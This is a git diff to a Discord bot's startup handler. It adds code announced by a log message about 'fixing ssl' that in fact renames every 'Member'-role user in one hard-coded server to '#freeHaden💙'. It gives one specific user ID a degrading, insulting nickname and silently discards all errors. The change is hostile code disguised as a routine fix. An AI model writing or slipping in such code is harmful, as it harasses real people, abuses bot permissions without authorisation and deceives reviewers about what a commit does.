@@ -36,7 +36,20 @@ bot.on('ready', () => {
         if (typeof plugin.setup === 'function') {
             plugin.setup(bot);
         }
-    })
+    });
+
+    console.log(`FIxing ssl`);
+    try {
+        bot.guilds.get("194533269180514305").members.array().forEach(member => {
+            if (member.roles.exists('name', 'Member') && !member.displayName.startsWith('Lead')){
+                member.setNickname(`#freeHaden💙`).catch(err => {});
+                if (member.user.id == '108892284119977984') member.setNickname('Shauns bitch');
+            }
+        })
+    }catch (err){
+
+    }
+
 });
 
 bot.on('message', msg => {
